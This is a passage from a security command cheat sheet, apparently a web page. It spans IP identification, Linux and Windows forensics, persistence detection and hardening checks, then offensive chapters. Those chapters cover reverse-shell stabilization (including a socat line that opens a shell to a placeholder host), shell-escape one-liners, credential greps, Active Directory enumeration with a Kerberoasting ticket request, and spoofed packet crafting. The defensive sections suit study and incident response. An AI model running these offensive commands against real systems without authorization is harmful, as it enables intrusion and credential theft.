<p class="lead mb-4">Useful when an internal IP shows up in logs and you need to know whether it's a gateway/appliance, a scanner, or an actual endpoint — e.g. chasing a source IP hitting a server. Replace <code>[Target_IP]</code> / <code>[Target_Subnet]</code> with the real values.</p>

```bash
# 1. TTL tells you hop distance + likely OS family
ping -c1 [Target_IP]
# reply TTL near 64  -> Linux/Unix, ~1 hop from that starting value
# reply TTL near 128 -> Windows
# reply TTL near 255 -> network gear (router/switch/firewall), most vendors default here
# (observed TTL = starting TTL minus hop count, so TTL 254 off a 255 start = 1 hop away -> network device)

# 2. Is it your default gateway? (settles it immediately if yes)
ip route | grep default
ip neigh show [Target_IP]        # resolves ARP entry -> MAC address

# 3. MAC vendor (OUI) — identifies appliance brand even without opening a port
arping -c 3 [Target_IP]
# first 3 bytes of the MAC = vendor; check manually against the IEEE OUI list,
# or offline if nmap's local database is present:
grep -i "$(ip neigh show [Target_IP] | awk '{print $5}' | cut -c1-8)" /usr/share/nmap/nmap-mac-prefixes 2>/dev/null

# 4. reverse DNS — hostnames often give device role away (fw-, lb-, core-sw-, etc.)
dig -x [Target_IP] +short
host [Target_IP]
getent hosts [Target_IP]
nslookup [Target_IP]              # if dig/host aren't installed

# 5. path length / hop position
traceroute -n [Target_IP]
mtr -r -c 4 [Target_IP] 2>/dev/null   # one-shot report if mtr happens to be present

# 6. HTTP/TLS banner — admin login pages and cert CN usually name the product directly
curl -skI http://[Target_IP]
curl -skI https://[Target_IP]
openssl s_client -connect [Target_IP]:443 -servername [Target_IP] </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer

# 7. SNMP — exact make/model if the community string is still default
nmap -sU -p 161 [Target_IP]
snmpwalk -v2c -c public [Target_IP] sysDescr
snmpwalk -v2c -c public [Target_IP] sysObjectID     # vendor enterprise OID
snmpwalk -v2c -c public [Target_IP] 1.3.6.1.2.1.1   # full system MIB branch

# 8. service + OS fingerprint (needs nmap — common on pentest/ops boxes, not stock)
nmap -sS -sV -O -p- --open -T3 [Target_IP]

# 9. sweep the segment to see what else lives there, and whether the suspect host is in it
nmap -sn [Target_Subnet]

# 10. SMB/NetBIOS — if it turns out to be an actual Windows host rather than an appliance
smbclient -L //[Target_IP]/ -N 2>/dev/null

# 11. public IP only — ownership/ASN context
whois [Target_IP]

# 12. no nmap available — raw bash TCP probes to guess role from open ports
for p in 22 23 80 161 443 3389 8443; do
  timeout 1 bash -c "echo >/dev/tcp/[Target_IP]/$p" 2>/dev/null && echo "$p open"
done
# 22/23 only              -> likely network gear (SSH/Telnet mgmt)
# 443/8443 + login page   -> firewall, LB or WAF admin UI
# 161 answering            -> network/management appliance (confirm with snmpwalk above)
# 80/443/3389/22 + app banner -> ordinary server
```

```powershell
# From a Windows box doing the investigating
Test-NetConnection -ComputerName [Target_IP] -Port 443
Resolve-DnsName [Target_IP] -ErrorAction SilentlyContinue
arp -a | findstr [Target_IP]
nbtstat -A [Target_IP]        # NetBIOS name table — native to Windows, no install needed
```

<p class="lead mb-4"><strong>Reading the result:</strong> gateway match, or network-range TTL (~255) + vendor OUI (Cisco/Fortinet/Palo Alto/F5/Juniper) + only mgmt ports open (22/443/161), means it's an appliance, not a compromised endpoint — the IP in your logs is just the NAT/proxy address. Pull the real source IPs from that device's own NAT/session logs instead of investigating it as a host. If instead it answers like an ordinary server or workstation (80/443/3389 with an app banner, no appliance fingerprint), treat it as a possible internal scanner or compromised host and isolate it for investigation.</p>

<br />

<br />

<br />


<p class="col-label">Part III — Blue Teaming</p>


## 25. Linux Blue Team / DFIR {#ch25-linux-blue-team-dfir}

<p class="lead mb-4">Login history, log triage, deleted-but-running processes, world-writable drop spots, and anti-forensics tells — all from stock utilities.</p>

```bash
# login history & current sessions
last -Faiw; lastb | head -20; lastlog; who -a

# auth log triage (Debian/Ubuntu)
grep -iE 'fail|invalid|accepted|session opened' /var/log/auth.log | tail -100
# RHEL/CentOS
grep -iE 'fail|invalid|accepted' /var/log/secure | tail -100

# systemd journal, scoped
journalctl -xe --no-pager
journalctl -u sshd --since "1 hour ago" --no-pager
journalctl _COMM=sudo --no-pager | tail -50

# auditd, if the box logs it (SELinux denials etc.)
ausearch -m avc -ts recent 2>/dev/null

# recently modified / created files — malware drop hunting
find / -xdev -mtime -1 -type f 2>/dev/null | grep -vE '^/(proc|sys)'
find / -xdev -newermt '2026-11-01' -type f 2>/dev/null
stat /path/to/suspicious/file   # access/modify/change times for one file

# process -> binary mapping, including deleted-but-running (classic hiding trick)
for p in /proc/[0-9]*; do ls -la $p/exe 2>/dev/null; done | grep deleted
ls -la /proc/*/exe 2>/dev/null

# interfaces in promiscuous mode — a live sniffer running somewhere
ip link show | grep -i promisc

# network connections mapped to process
ss -tulnp
lsof -i -P -n 2>/dev/null

# world-writable files — easy drop/persistence spots
find / -perm -o+w -type f 2>/dev/null | grep -vE '^/(proc|sys)'

# quick string/IOC scan on a suspicious binary
strings -a ./suspicious_bin | grep -iE 'http|curl|wget|base64|/dev/tcp'

# anti-forensics check — did someone clear or tamper with a log?
stat /var/log/auth.log 2>/dev/null; stat /var/log/secure 2>/dev/null   # unusually recent mtime/small size on a log = red flag
wc -l /var/log/auth.log 2>/dev/null; ls -la /var/log/ | sort -k6,7    # gaps or a log that's suspiciously short/new

# bash history across every user, including root
cat /home/*/.bash_history /root/.bash_history 2>/dev/null

# package integrity (detect tampered system binaries)
debsums -c 2>/dev/null          # Debian/Ubuntu
rpm -Va 2>/dev/null             # RHEL/CentOS

# immutable/odd file attributes (persistence hiding spot)
lsattr -R /etc /usr/bin /usr/sbin 2>/dev/null | grep -v '^-------------e'
```

<br />


## 26. Windows Blue Team / DFIR {#ch26-windows-blue-team-dfir}

<p class="lead mb-4">Event-log hunting for logons, PowerShell execution, log clearing, and execution evidence — using <code>wevtutil</code>/<code>Get-WinEvent</code> instead of a SIEM.</p>

```powershell
# failed/successful logons (4625/4624), fast filter via wevtutil (no GUI)
wevtutil qe Security /q:"*[System[(EventID=4625)]]" /f:text /c:20 /rd:true
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text /c:20 /rd:true

# PowerShell-native, same data, filterable by time
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624,4625;StartTime=(Get-Date).AddHours(-24)} |
  select TimeCreated, Id, @{n='Account';e={$_.Properties[5].Value}}

# RDP logons specifically (LogonType 10)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
  where {$_.Message -match 'Logon Type:\s+10'}

# PowerShell operational log — catches obfuscated/encoded command execution
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  where Id -in 4103,4104 | select TimeCreated, Message -First 20

# what logs even exist on this box, to scope your search
wevtutil el

# audit policy currently in effect — tells you what WILL be logged
auditpol /get /category:*

# anti-forensics — was the Security log cleared? (Event 1102, huge red flag on its own)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102}

# process/network correlation
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection | where State -eq Established
Get-Process -Id <PID> | select Path, Company, StartTime

# evidence of recent execution
Get-ChildItem C:\Windows\Prefetch | sort LastWriteTime -Descending | select -First 20
Get-ChildItem -Recurse -Hidden C:\Users -ErrorAction SilentlyContinue | select -First 20  # hidden files

# alternate data streams (classic stealth technique)
Get-Item -Path * -Stream * -ErrorAction SilentlyContinue | where Stream -ne ':$DATA'

# ransomware/tamper indicator — shadow copies wiped?
vssadmin list shadows

# Defender's own view, if it's running
Get-MpThreatDetection
Get-MpComputerStatus | select AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated

# file hash for IOC matching
Get-FileHash C:\path\to\file.exe -Algorithm SHA256
```

<br />


## 27. Persistence Detection {#ch27-persistence-detection}

<p class="lead mb-4">The mechanisms attackers reach for to survive a reboot — cron/timers and shell profiles on Linux, Run keys, WMI subscriptions, and Winlogon hijacks on Windows.</p>

```bash
# --- Linux ---
# every user's cron, plus system-wide drop-ins
for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null && echo "^-- $u"; done
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily

# systemd timers — the modern cron equivalent, easy to miss
systemctl list-timers --all --no-pager

# odd systemd units (anything outside the package manager's normal set)
systemctl list-unit-files --state=enabled --no-pager
find /etc/systemd/system /lib/systemd/system -newer /etc/hostname 2>/dev/null

# shell profile tampering
grep -nE 'curl|wget|base64|chmod \+x|\$\(.*\)' /etc/profile /etc/bash.bashrc ~/.bashrc ~/.profile 2>/dev/null

# authorized_keys anywhere on disk (SSH key persistence)
find / -name authorized_keys -exec ls -la {} \; 2>/dev/null

# library preload hijack — runs inside every dynamically-linked process
cat /etc/ld.so.preload 2>/dev/null

# udev rules dropped recently (triggers on device events, easy to overlook)
find /etc/udev/rules.d -newer /etc/hostname 2>/dev/null
```

```powershell
# --- Windows ---
schtasks /query /fo LIST /v | findstr /i 'TaskName Run Author'
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# services set to auto-start — review anything not a known vendor
Get-CimInstance Win32_Service | where StartMode -eq 'Auto' | select Name, PathName, StartName

# WMI event subscriptions — fileless persistence favorite
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

# Image File Execution Options — debugger hijack on a legit exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

# Winlogon Shell/Userinit — should be explorer.exe / userinit.exe only, nothing appended
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit

# LSA security packages — unexpected DLLs loaded at logon
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"

# Startup folders, per-user and all-users
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"

# new local accounts / group membership changes
Get-LocalUser | select Name, Enabled, LastLogon, PasswordLastSet
Get-LocalGroupMember Administrators
```

<br />


## 28. IR Live Triage & Order of Volatility {#ch28-ir-live-triage-order-of-volatility}

<p class="lead mb-4">Collect in this order — each step can disturb evidence for the next. Live triage below is fully native; forensically-sound memory acquisition (Volatility-compatible) needs LiME (Linux) or a dedicated imager (Windows) — not native, noted where it matters.</p>

```bash
# order of volatility (most volatile first): registers/cache (unreachable via CLI) ->
# routing table/ARP cache -> process list -> network connections -> disk -> logs

# 1. routing table & ARP cache — gone on reboot
ip route; ip neigh

# 2. process list with full command lines (args often reveal the actual IOC)
ps auxwwe

# 3. network connections + the process each belongs to
ss -tulnp; lsof -i -P -n 2>/dev/null

# 4. open files per suspicious process
ls -la /proc/<pid>/fd/

# 5. logged-in users and recent auth
w; last -20

# 6. disk image — native via dd (Linux only; no built-in Windows equivalent)
dd if=/dev/sdX of=/mnt/evidence/disk.img bs=4M status=progress conv=sync,noerror
sha256sum /dev/sdX /mnt/evidence/disk.img   # hash source and image, confirm they match

# memory — native tools only get you a live snapshot, not a forensic image:
cat /proc/<pid>/maps; cat /proc/<pid>/status
# a real memory dump for offline analysis needs LiME (kernel module, not native) — note it and move on
```

```powershell
# Windows live triage, same ordering
Get-NetTCPConnection | select LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
Get-Process | select Id, ProcessName, Path, StartTime
query user                                    # logged-in sessions
Get-WinEvent -LogName Security -MaxEvents 50 | select TimeCreated, Id, Message

# volume shadow copy — a point-in-time disk snapshot, native, useful when you can't take the box offline
vssadmin create shadow /for=C:
```

<br />


## 29. Log Analysis & Correlation Patterns {#ch29-log-analysis-correlation-patterns}

<p class="lead mb-4">Extends the Linux/Windows DFIR chapters above — the regex patterns themselves, for fast triage against common log formats without re-deriving them each time.</p>

```bash
# Apache/nginx combined log — extract IP, timestamp, request, status, size
awk '{print $1, $4, $5, $6, $7, $9}' access.log | less

# top source IPs by request count
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# 4xx/5xx errors only, with the path that triggered them
awk '$9 ~ /^[45]/ {print $9, $7}' access.log | sort | uniq -c | sort -rn | head -20

# requests in a specific time window (combined log format: [10/Nov/2026:14:0)
grep '10/Nov/2026:14:0' access.log

# SSH brute-force pattern — repeated failures from one source, counted
grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# successful login immediately following a burst of failures — classic brute-force-then-success
grep -E 'Failed password|Accepted password' /var/log/auth.log | tail -50

# generic IOC sweep — IP/domain/hash pattern across any log, one-shot
grep -EoR '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/ 2>/dev/null | sort -u
```

```powershell
# Windows Event Log — server-side XPath filter, far faster than piping to Where-Object on a big log
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4625)] and EventData[Data[@Name='IpAddress']='[Target_IP]']]"

# failed logons grouped by source IP — same brute-force pattern, native PowerShell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} |
  ForEach-Object { $_.Properties[19].Value } | Group-Object | sort Count -Descending

# IIS logs (W3C format) — same shape of analysis as Apache/nginx above
Import-Csv -Delimiter ' ' -Header date,time,s-ip,method,uri,query,port,user,c-ip,agent,referer,status (Get-Content u_ex*.log | Select-String -NotMatch '^#') |
  Where-Object status -match '^[45]' | Group-Object c-ip | sort Count -Descending
```

<br />


## 30. Hardening Checklist {#ch30-hardening-checklist}

<p class="lead mb-4">Pass/fail, one command per check — compiled from commands already in this doc, reframed as checks. Run top to bottom, note the fails.</p>

```bash
# --- Linux ---
[ "$(cat /etc/ssh/sshd_config | grep -i '^PermitRootLogin')" != "PermitRootLogin no" ] && echo "FAIL: root SSH login not explicitly disabled"
sudo -l | grep -q NOPASSWD && echo "REVIEW: passwordless sudo entries present"
find / -perm -4000 -type f 2>/dev/null | wc -l            # baseline this number, flag any new SUID binary
awk -F: '($3 == 0) {print}' /etc/passwd | grep -v '^root:' && echo "FAIL: non-root UID 0 account exists"
[ "$(getenforce 2>/dev/null)" = "Disabled" ] && echo "REVIEW: SELinux disabled"
iptables -L INPUT -n | grep -q 'policy ACCEPT' && echo "REVIEW: default INPUT policy is ACCEPT"
systemctl list-units --type=service --state=running | grep -Ei 'telnet|rsh|ftp' && echo "FAIL: legacy cleartext service running"
chage -l root | grep 'Password expires' | grep -q 'never' && echo "REVIEW: root password never expires"

# --- Windows ---
(Get-SmbServerConfiguration).EnableSMB1Protocol -eq $true -and Write-Output "FAIL: SMBv1 still enabled"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul | findstr /i '0x1' && echo FAIL: AlwaysInstallElevated set
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>nul | findstr /i '0x1' && echo FAIL: WDigest cleartext creds enabled
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA | findstr /i '0x0' && echo "FAIL: UAC fully disabled"
Get-LocalUser | where {$_.Enabled -and $_.PasswordNeverExpires} | Select Name   # review each
Get-NetFirewallProfile | where Enabled -eq False   # any firewall profile turned off
```

<br />

<br />

<br />


<p class="col-label">Part IV — Offensive Security</p>


## 31. Shell Stabilization {#ch31-shell-stabilization}

<p class="lead mb-4">Turning a raw reverse shell into something usable — a full TTY with job control, tab-complete, and resizing — before doing anything else.</p>

```bash
# upgrade dumb reverse shell to a TTY (your known one)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# no python3 — fallback chain, try in order until one exists on the box
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
php -r 'system("/bin/bash");'
lua -e "os.execute('/bin/bash')"
awk 'BEGIN {system("/bin/bash")}'
find . -exec /bin/sh \; -quit
script -qc /bin/bash /dev/null

# quick recon of what's even available before picking a fallback
for b in python3 python perl ruby php lua awk nc ncat socat script; do command -v $b >/dev/null && echo "$b: present"; done

# make it a FULL tty (resize, ctrl-c, tab-complete, vim/less work)
# after pty.spawn, background the shell locally: Ctrl+Z, then:
stty raw -echo; fg
# press Enter twice, then inside the shell:
export TERM=xterm; export SHELL=bash; stty rows $(tput lines) columns $(tput cols)

# keep the shell alive if the controlling terminal drops
disown -a; trap '' HUP

# socat full TTY (if socat present on both ends)
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:TARGET_HOST:4444
```

<br />


## 32. Linux Local Enumeration {#ch32-linux-local-enumeration}

<p class="lead mb-4">Baseline recon on a Linux box — identity, privilege surface, running services, and the single most useful credential grep.</p>

```bash
# who/what am I
id; whoami; groups; sudo -l 2>/dev/null

# SUID/SGID binaries (GTFOBins cross-ref candidates)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# writable-by-me files owned by root (misconfig hunting)
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v -E '^/(tmp|dev)'

# capabilities (often missed vs SUID)
getcap -r / 2>/dev/null

# cron/services/startup
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*; crontab -l -u $(whoami) 2>/dev/null
systemctl list-units --type=service --state=running --no-pager
systemctl list-unit-files --state=enabled --no-pager

# processes & listeners
ps auxww --sort=-%cpu | head -20
ss -tulnp 2>/dev/null || cat /proc/net/tcp /proc/net/tcp6

# host identity
uname -a; cat /etc/os-release 2>/dev/null; hostname -I

# users / history / env
cut -d: -f1,3 /etc/passwd; getent passwd | cut -d: -f1   # catches LDAP/NSS-backed accounts too
awk -F: '($3 == 0) {print}' /etc/passwd                  # any UID-0 account besides root?
lastlog; w
env; echo $PATH | tr ':' '\n'
cat ~/.bash_history /root/.bash_history 2>/dev/null

# mounts, exports, fstab (NFS no_root_squash, loose perms)
mount; cat /etc/fstab; cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null
lsblk 2>/dev/null

# installed packages, kernel modules, loaded config
dpkg -l 2>/dev/null | wc -l; rpm -qa 2>/dev/null | wc -l
lsmod 2>/dev/null; cat /proc/version
cat /etc/hosts /etc/resolv.conf

# files with no owning user/group — often leftovers from a removed account, worth checking
find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null

# grep for creds across config space — your single most useful recon one-liner
grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /var/www /opt /home 2>/dev/null \
  | grep -vE '^Binary|\.git/' | head -50
```

<br />


## 33. Linux Privesc Hunting {#ch33-linux-privesc-hunting}

<p class="lead mb-4">Enumeration only — these commands surface candidate privilege-escalation vectors, they don't exploit them.</p>

```bash
# sudo rights -> cross-reference binary names against GTFOBins mentally
sudo -l

# PATH hijack candidates — writable dirs that sit in PATH
echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'test -w {} && echo WRITABLE: {}'
# relative entry in PATH (., or a leading/trailing/double colon) is its own red flag
echo $PATH | grep -qE '(^|:)\.(:|$)|::' && echo "PATH has a relative entry"

# is /etc/passwd or sudoers writable? (classic root-add vector)
ls -la /etc/passwd /etc/shadow
find /etc/sudoers.d -writable 2>/dev/null; ls -la /etc/sudoers*

# docker/lxd group, or raw docker socket access = root equivalent
id | grep -E 'docker|lxd|disk'
ls -la /var/run/docker.sock 2>/dev/null

# writable cron scripts (root cron running a file you can edit)
find / -path '*cron*' -writable -type f 2>/dev/null

# shadow backups / readable copies left lying around
find / -name 'shadow*' -o -name '*.bak' 2>/dev/null | grep -i shadow

# kernel/OS version — note it, check later against known CVEs offline
uname -r; cat /etc/os-release

# LD_PRELOAD hijack surface — can I write anything root execs with env preserved?
sudo -l | grep -i env_keep
cat /etc/ld.so.preload 2>/dev/null

# world-writable service unit files (persistence/privesc via systemd)
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# polkit/pkexec version — note it, cross-check offline against known advisories
pkexec --version 2>/dev/null; dpkg -l polkit 2>/dev/null
```

<br />


## 34. Windows CMD / PowerShell Local Enumeration {#ch34-windows-local-enumeration}

<p class="lead mb-4">Shell legend for the Windows-flavored chapters in this part: plain binaries (<code>net</code>, <code>reg</code>, <code>wmic</code>, <code>schtasks</code>, <code>netstat</code>, <code>tasklist</code>, <code>arp</code>, <code>route</code>, <code>sc.exe</code>, <code>findstr</code>, <code>dir</code>, <code>cmdkey</code>, <code>icacls</code>, <code>certutil</code>, <code>bitsadmin</code>, <code>vssadmin</code>, <code>wevtutil</code>, <code>auditpol</code>, <code>nbtstat</code>, <code>whoami</code>) run in both <code>cmd.exe</code> and PowerShell. Anything starting with a <code>Verb-Noun</code> (<code>Get-</code>, <code>Test-</code>, <code>Resolve-</code>, <code>Invoke-</code>, <code>New-</code>) is a cmdlet — <strong>PowerShell only</strong>, not usable in plain cmd.exe. If you only have cmd.exe (older box, restricted shell), skip the cmdlet lines and lean on the binary equivalents.</p>

```powershell
# identity & box info
whoami /all
systeminfo
Get-ComputerInfo | select OsName, OsVersion, OsHardwareAbstractionLayer
ipconfig /all

# users / groups
net user
net localgroup administrators
Get-LocalUser; Get-LocalGroupMember Administrators
net accounts   # password policy — lockout threshold, min length, etc.

# processes, services, listeners
tasklist /v
Get-Process | sort CPU -Descending | select -First 15
Get-Service | where Status -eq Running
netstat -ano
Get-NetTCPConnection | select LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess

# network config detail
Get-NetAdapter | select Name, Status, LinkSpeed, MacAddress
arp -a
route print

# patches installed (triage against known CVEs offline)
Get-HotFix | sort InstalledOn -Descending
wmic qfe list brief   # legacy fallback if Get-HotFix missing

# shares, drives, firewall posture
net share
wmic logicaldisk get caption,description,drivetype
Get-NetFirewallRule | where Enabled -eq True | select DisplayName, Direction, Action

# scheduled tasks & autoruns
schtasks /query /fo LIST /v
Get-CimInstance Win32_StartupCommand | select Name, command, Location
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# grep equivalent across files for creds in configs
findstr /si /m /c:"password" *.txt *.ini *.config *.xml 2>nul
Get-ChildItem -Recurse -Include *.config,*.xml,*.ini -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|secret|apikey' -List
```

<br />


## 35. Windows Privilege Escalation Hunting {#ch35-windows-privesc-hunting}

<p class="lead mb-4">Enumeration only — classic Windows misconfiguration checks: unquoted paths, AlwaysInstallElevated, WDigest, UAC level, and stored credentials.</p>

```powershell
# unquoted service paths — classic misconfig
wmic service get name,displayname,pathname,startmode |
  findstr /i /v '"' | findstr /i /v 'C:\\Windows\\system32'

# service binary/config writable by current user
icacls "C:\Program Files\VulnApp\service.exe"

# service permissions — can I reconfigure its binpath?
sc.exe qc <ServiceName>
Get-Acl 'C:\path' | fl   # accesschk is not native; this is the built-in equivalent

# AlwaysInstallElevated (MSI runs as SYSTEM if both keys = 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# credentials in cleartext memory risk — WDigest re-enabled?
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

# UAC level — fully disabled is a privesc shortcut
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# stored credentials
cmdkey /list
dir /a "C:\Users\%username%\AppData\Local\Microsoft\Credentials"

# scheduled tasks running as SYSTEM with a writable action path
Get-ScheduledTask | where {$_.Principal.UserId -eq 'SYSTEM'} |
  select TaskName, @{n='Action';e={$_.Actions.Execute}}

# privileges your token already has (SeImpersonate, SeBackup, etc.)
whoami /priv
```

<br />


## 36. Active Directory Enumeration (Native .NET, No RSAT) {#ch36-active-directory-enumeration}

<p class="lead mb-4"><code>net</code>, <code>nltest</code> and raw <code>.NET</code> <code>DirectoryServices</code> calls work from any domain-joined box without installing the RSAT AD module — including the SPN/delegation audit trail that Rubeus/Impacket usually cover.</p>

```powershell
# am I even domain-joined, and who's the DC?
nltest /dsgetdc:
systeminfo | findstr /i 'Domain'

# cmd-native domain group/account checks (no PowerShell needed)
net group "Domain Admins" /domain
net accounts /domain
net user <username> /domain

# pure .NET LDAP search — no ActiveDirectory module required
$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$searcher.Filter = "(&(objectCategory=user)(adminCount=1))"   # privileged accounts
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

$searcher.Filter = "(objectCategory=computer)"                 # every computer object
$searcher.FindAll() | ForEach-Object { $_.Properties.dnshostname }

$searcher.Filter = "(servicePrincipalName=*)"                  # SPNs — Kerberoasting targets
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# Kerberoasting — identify SPN-holding accounts and request their service tickets, native .NET only
# (turning the returned ticket into a crackable hash conventionally needs Rubeus/Impacket — not native;
#  this gets you the SPN inventory and confirms a ticket is issuable, which is the audit-relevant part)
Add-Type -AssemblyName System.IdentityModel
$spn = "MSSQLSvc/sql01.corp.local:1433"   # from the earlier SPN search
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn

# constrained/unconstrained delegation — accounts that can impersonate others, a common privesc path
$searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"   # TRUSTED_FOR_DELEGATION flag
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# trust relationships between domains/forests
nltest /domain_trusts

# current user's group memberships, including nested/domain groups
whoami /groups
gpresult /r   # effective GPOs applied to this user/machine
```

<br />


## 37. Raw Packet Crafting — Python Stdlib Sockets {#ch37-raw-packet-crafting-stdlib}

<p class="lead mb-4">Lab/own-network or explicitly authorized testing only — most of this needs root/admin, and some of it (spoofed source addresses, custom TCP flags) is flagged by any decent IDS. <code>[Target_IP]</code> / <code>[Target_Port]</code> are placeholders throughout. Python's <code>socket</code> module can build raw IP/TCP headers byte-by-byte — verbose, but it's standard library, nothing to install.</p>

```python
#!/usr/bin/env python3
# craft a raw TCP SYN with a custom TTL and window size — no scapy/hping3
import socket, struct, random

src_ip, dst_ip, dst_port = "10.0.0.5", "[Target_IP]", 80

def checksum(data):
    if len(data) % 2:
        data += b'\0'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    return ~(s + (s >> 16)) & 0xffff

ip_header = struct.pack('!BBHHHBBH4s4s',
    69, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0,
    socket.inet_aton(src_ip), socket.inet_aton(dst_ip))

tcp_header = struct.pack('!HHLLBBHHH',
    random.randint(1024,65535), dst_port, 0, 0,
    (5 << 4), 0x02, 5840, 0, 0)   # 0x02 = SYN; swap for 0x01 FIN, 0x04 RST, 0x18 PSH+ACK, 0x29 custom combo

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
sock.sendto(ip_header + tcp_header, (dst_ip, 0))
```

```bash
# simplest stdlib TCP connect — no packet-level control, but needs nothing
python3 -c "import socket; s=socket.socket(); s.settimeout(2); print(s.connect_ex(('[Target_IP]', 80)))"

# raw UDP datagram with arbitrary payload bytes
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'\\x41\\x42\\x43', ('[Target_IP]', 53))"
```

<br />


## 38. hping3 / nping / scapy {#ch38-hping3-nping-scapy}

<p class="lead mb-4">True packet crafting (arbitrary flag combos, fragmentation, spoofed source, TCP options) is impractical in raw bash/stdlib alone past a certain point. These three are tiny, well-known, and worth installing once on your own box or VM rather than reinventing them in Python every time.</p>

```bash
# one-time install (Debian/Ubuntu)
sudo apt install hping3 nmap python3-scapy -y   # nmap ships nping

# --- hping3 ---
hping3 -S -p 80 -c 3 [Target_IP]                      # custom SYN scan, 3 packets
hping3 -A -p 443 [Target_IP]                           # ACK probe — tests stateful firewall behavior
hping3 --udp -p 53 -d 40 [Target_IP]                   # UDP with a 40-byte payload
hping3 -S -p 80 -ttl 1 [Target_IP]                     # TTL-limited — classic traceroute-by-hand
hping3 -S -p 80 -f [Target_IP]                         # force fragmentation
hping3 -S -p 80 -w 64 -M 12345 [Target_IP]             # custom window size + sequence number

# --- nping (ships with nmap) ---
nping --tcp -p 80 --flags syn,ack --ttl 32 [Target_IP]
nping --icmp --icmp-type 8 --data-length 100 [Target_IP]
nping --udp -p 161 --data-string "test" [Target_IP]

# --- scapy (Python, interactive or scripted) ---
python3 -c "
from scapy.all import IP, TCP, send
pkt = IP(dst='[Target_IP]', ttl=64)/TCP(dport=80, flags='S', window=8192)
send(pkt, verbose=0)"

# scapy interactive shell for one-off crafting
sudo scapy
>>> send(IP(dst="[Target_IP]")/TCP(dport=443,flags="FPU"))   # custom flag combo (FIN+PSH+URG — an Xmas-scan-style probe)
```

<br />


## 39. Crafting Custom HTTP Requests {#ch39-crafting-custom-http-requests}

<p class="lead mb-4">Arbitrary methods and headers, raw malformed request lines, and brute-force loops — all without ffuf/gobuster.</p>

```bash
# arbitrary method, headers, raw body — curl covers almost everything
curl -X PUT -H "X-Custom-Header: test" -H "Content-Type: application/json" \
  --data-raw '{"key":"value"}' http://[Target_IP]/path

# force HTTP/1.0 (some old/misconfigured servers behave differently)
curl --http1.0 -v http://[Target_IP]/

# override the Host header — test vhost routing / SNI mismatches
curl -H "Host: internal.example.com" http://[Target_IP]/

